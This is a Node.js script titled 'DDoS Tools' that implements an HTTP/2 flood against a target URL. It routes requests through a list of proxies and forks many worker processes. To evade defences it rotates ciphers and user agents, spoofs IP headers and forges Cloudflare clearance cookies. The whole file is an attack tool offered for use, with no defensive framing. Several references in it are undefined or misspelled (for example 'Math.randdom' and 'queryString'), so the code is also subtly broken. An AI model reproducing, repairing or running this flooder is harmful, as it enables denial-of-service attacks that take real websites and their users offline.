'DDoS Tools'
    ; ('Author : Anoy')
const net = require('net'),
    http2 = require('http2'),
    tls = require('tls'),
    cluster = require('cluster'),
    url = require('url'),
    crypto = require('crypto'),
    fs = require('fs'),
    axios = require('axios')
var path = require('path')
const UserAgent = require('user-agents'),
    https = require('https')
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (error) { })
process.argv.length < 7 &&
    (process.argv.length < 7 && console.log('   '),
        process.argv.length < 7 &&

        process.argv.length < 7 &&

        process.argv.length < 7 && console.log('   '),
        process.argv.length < 7 &&

        process.argv.length < 7 &&

        process.argv.length < 7 &&

        process.exit())
const headers = {}
function readLines(filename) {
    return fs.readFileSync(filename, 'utf-8').toString().split(/\r?\n/)
}
const getCurrentTime = () => {
    const currentDate = new Date(),
        hours = currentDate.getHours().toString().padStart(2, '0'),
        minutes = currentDate.getMinutes().toString().padStart(2, '0'),
        seconds = currentDate.getSeconds().toString().padStart(2, '0')
    return (
        '\x1B[31m(\x1B[32m' +
        hours +
        ':' +
        minutes +
        ':' +
        seconds +
        '\x1B[31m)\x1B[0m'
    )
},
    targetURL = process.argv[2],
    agent = new https.Agent({ rejectUnauthorized: false })
function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('\x1B[31mRequest timed out'))
        }, 5000)
    }),
        axiosPromise = axios.get(targetURL, { httpsAgent: agent })
    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response
            console.log(
                '\x1B[31m[\x1B[33mSYSTEM\x1B[31m]\x1B[0m ' +
                getCurrentTime() +
                ' Title: ' +
                getTitleFromHTML(data) +
                ' (\x1B[32m' +
                status +
                '\x1B[0m)'
            )
        })
        .catch((error) => {
            if (error.message === '\x1B[31mRequest timed out\x1B[0m') {
                console.log(
                    '\x1B[31m[\x1B[33mSYSTEM\x1B[31m]\x1B[0m ' +
                    getCurrentTime() +
                    ' \x1B[31mRequest Timed Out\x1B[0m'
                )
            } else {
                if (error.response) {
                    const title = getTitleFromHTML(error.response.data)
                    console.log(
                        '\x1B[31m[\x1B[33mSYSTEM\x1B[31m]\x1B[0m ' + getCurrentTime() + ' '
                    )
                    console.log(
                        '\x1B[31m[\x1B[33mSYSTEM\x1B[31m]\x1B[0m ' +
                        getCurrentTime() +
                        ' \x1B[0mTitle: ' +
                        title +
                        ' (\x1B[0m' +
                        error.response.status +
                        '\x1B[0m)'
                    )
                } else {
                    console.log(
                        '\x1B[31m[\x1B[33mSYSTEM\x1B[31m]\x1B[0m ' +
                        getCurrentTime() +
                        ' ' +
                        error.message +
                        ' \x1B[0m'
                    )
                }
            }
        })
}
function getTitleFromHTML(html) {
    const titleMatch = html.match(/<title>(.*?)<\/title>/i)
    if (titleMatch && titleMatch[1]) {
        return titleMatch[1]
    }
    return 'Not Found'
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min)
}
function randomElement(array) {
    return array[randomIntn(0, array.length)]
}
function randstr(length) {
    const characters =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    const charactersLength = characters.length
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength))
    }
    return result
}
const ip_spoof = () => {
    const generateOctet = () => {
        return Math.floor(Math.random() * 255)
    }
    return (
        generateOctet() + '.' + generateOctet() + '.' + generateOctet() + '.' + generateOctet()
    )
},
    spoofed = ip_spoof(),
    args = {
        target: process.argv[2],
        time: ~~process.argv[3],
        Rate: ~~process.argv[4],
        threads: ~~process.argv[5],
        proxyFile: process.argv[6],
    }
if (cluster.isMaster) {
    console.clear()
    console.log(
        '\n  \n    \u2588\u2580\u2584\u2580\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2584 \u2588\u2500\u2500\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2588 \n    \u2588\u2500\u2580\u2500\u2588 \u2588\u2580\u2580 \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2580\u2580\u2588 \u2588\u2584\u2584\u2588 \n    \u2580\u2500\u2500\u2500\u2580 \u2580\u2580\u2580 \u2580\u2580\u2580\u2500 \u2500\u2580\u2580\u2580 \u2580\u2580\u2580 \u2580\u2500\u2500\u2580 v3.0 '
    )
    console.log('--------------------------------------------')
    console.log('Target: ' + process.argv[2])
    console.log('Time: ' + process.argv[3])
    console.log('Rate: ' + process.argv[4])
    console.log('Thread: ' + process.argv[5])
    console.log('ProxyFile: ' + process.argv[6])
    console.log('--------------------------------------------')
    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork()
        console.log(
            '\x1B[31m[\x1B[33mSYSTEM\x1B[31m] \x1B[0m' +
            getCurrentTime() +
            ' Attack Thread ' +
            i +
            ' Started'
        )
    }
    console.log(
        '\x1B[31m[\x1B[33mSYSTEM\x1B[31m] \x1B[0m' +
        getCurrentTime() +
        ' SYSTEM Attacking..'
    )
    setInterval(getStatus, 2000)
    setTimeout(() => {
        console.log(
            '\x1B[31m[\x1B[33mSYSTEM\x1B[31m] \x1B[0m' +
            getCurrentTime() +
            ' The Attack Is Over'
        )
        process.exit(1)
    }, process.argv[3] * 1000)
}
const sig = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
],
    pathts = [
        '/',
        '?page=1',
        '?page=2',
        '?page=3',
        '?category=news',
        '?category=sports',
        '?category=technology',
        '?category=entertainment',
        '?sort=newest',
        '?filter=popular',
        '?limit=10',
        '?start_date=1989-06-04',
        '?end_date=1989-06-04',
    ],
    cplist = [
        'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
        'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
        'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    ],
    accept_header = [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    ],
    lang_header = ['en-US,en;q=0.9'],
    encoding_header = ['gzip, deflate, br'],
    control_header = ['no-cache', 'max-age=0'],
    refers = [
        'http://anonymouse.org/cgi-bin/anon-www.cgi/',
        'http://coccoc.com/search#query=',
        'http://ddosvn.somee.com/f5.php?v=',
        'http://engadget.search.aol.com/search?q=',
        'http://engadget.search.aol.com/search?q=query?=query=&q=',
        'http://eu.battle.net/wow/en/search?q=',
        'http://filehippo.com/search?q=',
        'http://funnymama.com/search?q=',
        'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
        'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
        'http://go.mail.ru/search?mail.ru=1&q=',
        'http://help.baidu.com/searchResult?keywords=',
        'http://host-tracker.com/check_page/?furl=',
        'http://itch.io/search?q=',
        'http://jigsaw.w3.org/css-validator/validator?uri=',
        'http://jobs.bloomberg.com/search?q=',
        'http://jobs.leidos.com/search?q=',
        'http://jobs.rbs.com/jobs/search?q=',
        'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
        'http://louis-ddosvn.rhcloud.com/f5.html?v=',
        'http://millercenter.org/search?q=',
        'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
        'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
        'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
        'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
        'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
        'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
        'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=',
        'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/',
        'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=',
        'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/',
        'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
        'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
        'http://search.aol.com/aol/search?q=',
        'http://taginfo.openstreetmap.org/search?q=',
        'http://techtv.mit.edu/search?q=',
        'http://validator.w3.org/feed/check.cgi?url=',
        'http://vk.com/profile.php?redirect=',
        'http://www.ask.com/web?q=',
        'http://www.baoxaydung.com.vn/news/vn/search&q=',
        'http://www.bestbuytheater.com/events/search?q=',
        'http://www.bing.com/search?q=',
        'http://www.evidence.nhs.uk/search?q=',
        'http://www.google.com/?q=',
        'http://www.google.com/translate?u=',
        'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
        'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
        'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
        'http://www.pagescoring.com/website-speed-test/?url=',
        'http://www.reddit.com/search?q=',
        'http://www.search.com/search?q=',
        'http://www.shodanhq.com/search?q=',
        'http://www.ted.com/search?q=',
        'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://www.ustream.tv/search?q=',
        'http://yandex.ru/yandsearch?text=',
        'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
        'http://ytmnd.com/search?q=',
        'https://add.my.yahoo.com/rss?url=',
        'https://careers.carolinashealthcare.org/search?q=',
        'https://check-host.net/',
        'https://developers.google.com/speed/pagespeed/insights/?url=',
        'https://drive.google.com/viewerng/viewer?url=',
        'https://duckduckgo.com/?q=',
        'https://google.com/',
        'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
        'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
        'https://help.baidu.com/searchResult?keywords=',
        'https://play.google.com/store/search?q=',
        'https://pornhub.com/',
        'https://r.search.yahoo.com/',
        'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
        'https://steamcommunity.com/market/search?q=',
        'https://vk.com/profile.php?redirect=',
        'https://www.bing.com/search?q=',
        'https://www.cia.gov/index.html',
        'https://www.facebook.com/',
        'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
        'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
        'https://www.fbi.com/',
        'https://www.google.ad/search?q=',
        'https://www.google.ae/search?q=',
        'https://www.google.al/search?q=',
        'https://www.google.co.ao/search?q=',
        'https://www.google.com.af/search?q=',
        'https://www.google.com.ag/search?q=',
        'https://www.google.com.ai/search?q=',
        'https://www.google.com/search?q=',
        'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
        'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
        'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
        'https://www.npmjs.com/search?q=',
        'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
        'https://www.pinterest.com/search/?q=',
        'https://www.qwant.com/search?q=',
        'https://www.ted.com/search?q=',
        'https://www.usatoday.com/search/results?q=',
        'https://www.yandex.com/yandsearch?text=',
        'https://www.youtube.com/',
        'https://yandex.ru/',
        'https://www.google.com/search?q=',
        'https://check-host.net/',
        'https://www.facebook.com/',
        'https://www.youtube.com/',
        'https://www.fbi.com/',
        'https://www.bing.com/search?q=',
        'https://r.search.yahoo.com/',
        'https://www.cia.gov/index.html',
        'https://vk.com/profile.php?redirect=',
        'https://www.usatoday.com/search/results?q=',
        'https://help.baidu.com/searchResult?keywords=',
        'https://steamcommunity.com/market/search?q=',
        'https://www.ted.com/search?q=',
        'https://play.google.com/store/search?q=',
        'https://www.qwant.com/search?q=',
        'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
        'https://www.google.ad/search?q=',
        'https://www.google.ae/search?q=',
        'https://www.google.com.af/search?q=',
        'https://www.google.com.ag/search?q=',
        'https://www.google.com.ai/search?q=',
        'https://www.google.al/search?q=',
        'https://www.google.am/search?q=',
        'https://www.google.co.ao/search?q=',
    ],
    defaultCiphers = crypto.constants.defaultCoreCipherList.split(':'),
    ciphers1 =
        'GREASE:' +
        [
            defaultCiphers[2],
            defaultCiphers[1],
            defaultCiphers[0],
            ...defaultCiphers.slice(3),
        ].join(':'),
    uap = [
        'Peach/1.01 (Ubuntu 8.04 LTS; U; en)',
        'POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1',
        'POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1',
        'portalmmm/2.0 N410i(c20;TB) ',
        'Python-urllib/2.5',
        'SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3',
        'SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
        'SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)',
        'SearchExpress',
        'SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)',
        'SEC-SGHX210/1.0 UP.Link/6.3.1.13.0',
        'SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0',
        'SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
        'SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonT100/R101',
        'SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0',
        'SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonT68/R201A',
        'SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
        'SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1',
        'SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]',
        'SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0',
        'SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0',
        'SuperBot/4.4.0.60 (Windows XP)',
        'Uzbl (Webkit 1.3) (Linux i686 [i686])',
        'Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1',
        'W3C_Validator/1.305.2.12 libwww-perl/5.64',
        'W3C_Validator/1.654',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36',
    ],
    Methods = [
        'GET',
        'HEAD',
        'POST',
        'PUT',
        'DELETE',
        'CONNECT',
        'OPTIONS',
        'TRACE',
        'PATCH',
    ],
    RipperSec = Methods[Math.floor(Math.random() * Methods.length)]
var randomReferer = refers[Math.floor(Math.random() * refers.length)],
    cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))],
    siga = sig[Math.floor(Math.floor(Math.random() * sig.length))],
    uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))],
    Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))],
    accept =
        accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))],
    lang =
        lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))],
    encoding =
        encoding_header[
        Math.floor(Math.floor(Math.random() * encoding_header.length))
        ],
    control =
        control_header[
        Math.floor(Math.floor(Math.random() * control_header.length))
        ],
    proxies = readLines(args.proxyFile)
const parsedTarget = url.parse(args.target)
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork()
    }
} else {
    setInterval(runFlooder)
}
class NetSocket {
    constructor() { }
    ['HTTP'](proxyInfo, callback) {
        const addressParts = proxyInfo.address.split(':'),
            ipAddress = addressParts[0],
            connectRequest =
                'CONNECT ' +
                proxyInfo.address +
                ':443 HTTP/1.1\r\nHost: ' +
                proxyInfo.address +
                ':443\r\nConnection: Keep-Alive\r\n\r\n',
            bufferRequest = new Buffer.from(connectRequest),
            socket = net.connect({
                host: proxyInfo.host,
                port: proxyInfo.port,
            })
        socket.setTimeout(proxyInfo.timeout * 100000)
        socket.setKeepAlive(true, 100000)
        socket.on('connect', () => {
            socket.write(bufferRequest)
        })
        socket.on('data', (data) => {
            const response = data.toString('utf-8'),
                isSuccess = response.includes('HTTP/1.1 200')
            if (isSuccess === false) {
                return (
                    socket.destroy(),
                    callback(undefined, 'error: invalid response from proxy server')
                )
            }
            return callback(socket, undefined)
        })
        socket.on('timeout', () => {
            return (
                socket.destroy(), callback(undefined, 'error: timeout exceeded')
            )
        })
        socket.on('error', (error) => {
            return socket.destroy(), callback(undefined, 'error: ' + error)
        })
    }
}
const Socker = new NetSocket()
headers[':method'] = RipperSec
headers[':authority'] = parsedTarget.host
headers[':path'] =
    parsedTarget.path +
    pathts[Math.floor(Math.randdom() * pathts.length)] +
    '&' +
    randstr(10) +
    queryString +
    randstr(10)
headers[':scheme'] = 'https'
headers['x-forwarded-proto'] = 'https'
headers['cache-control'] = control
headers['X-Forwarded-For'] = spoofed
headers['sec-ch-ua'] =
    '"Not A Brand";v="99", "Google Chrome";v="121", "Chromium";v="121", "Opera GX";v="106"'
headers['sec-ch-ua-mobile'] = randomElement(['?0', '?1'])
headers['sec-ch-ua-platform'] = randomElement([
    'Android',
    'iOS',
    'Linux',
    'macOS',
    'Windows',
])
headers['accept-language'] = lang
headers['accept-encoding'] = encoding
headers['upgrade-insecure-requests'] = Math.random() > 0.5
headers.Connection = Math.random() > 0.5 ? 'keep-alive' : 'close'
headers.accept = accept
headers['user-agent'] = uap1
headers['sec-fetch-mode'] = 'navigate'
headers['sec-fetch-dest'] = dest1
headers['sec-fetch-user'] = '?1'
headers.TE = 'trailers'
headers.cookie =
    'cf_clearance=' +
    randstr(4) +
    '.' +
    randstr(20) +
    '.' +
    randstr(40) +
    '-0.0.1 ' +
    randstr(20) +
    ';_ga=' +
    randstr(20) +
    ';_gid=' +
    randstr(15)
headers['sec-fetch-site'] = site1
headers['x-requested-with'] = 'XMLHttpRequest'
headers['alt-svc'] = randomHeaders['alt-svc']
headers.Via = spoofed
headers.sss = spoofed
headers['Sec-Websocket-Key'] = spoofed
headers['Sec-Websocket-Version'] = 13
headers.Upgrade = websocket
headers['X-Forwarded-For'] = spoofed
headers['X-Forwarded-Host'] = spoofed
headers['Client-IP'] = spoofed
headers['Real-IP'] = spoofed
headers.Referer = randomReferer
headers.Referer = Ref
function runFlooder() {
    const randomProxy = randomElement(proxies),
        proxyParts = randomProxy.split(':')
    headers.referer = 'https://' + parsedTarget.host + '/?' + randstr(15)
    headers.origin = 'https://' + parsedTarget.host
    headers[':authority'] = parsedTarget.host
    headers['user-agent'] = uap1
    const proxyOptions = {
        host: proxyParts[0],
        port: ~~proxyParts[1],
        address: parsedTarget.host + ':443',
        timeout: 100,
    }
    Socker.HTTP(proxyOptions, (socket, error) => {
        if (error) {
            return
        }
        socket.setKeepAlive(true, 600000)
        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: socket,
            ciphers: tls.getCiphers().join(':') + cipper,
            ecdhCurve: 'prime256v1:X25519',
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: [
                'TLS_method',
                'TLSv1_1_method',
                'TLSv1_2_method',
                'TLSv1_3_method',
            ],
        },
            tlsConn = tls.connect(443, parsedTarget.host, tlsOptions)
        tlsConn.setKeepAlive(true, 60000)
        const http2Conn = http2.connect(parsedTarget.href, {
            protocol: 'https:',
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: socket,
        })
        http2Conn.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false,
        })
        http2Conn.on('connect', () => {
            const intervalId = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = http2Conn
                        .request(headers)
                        .on('response', (response) => {
                            request.close()
                            request.destroy()
                            return
                        })
                    request.end()
                }
            }, 1000)
        })
        http2Conn.on('close', () => {
            http2Conn.destroy()
            socket.destroy()
            return
        })
    })
        ; (function (param1, param2, param3) { })
}
const KillScript = () => process.exit(1)
setTimeout(KillScript, args.time * 1000)
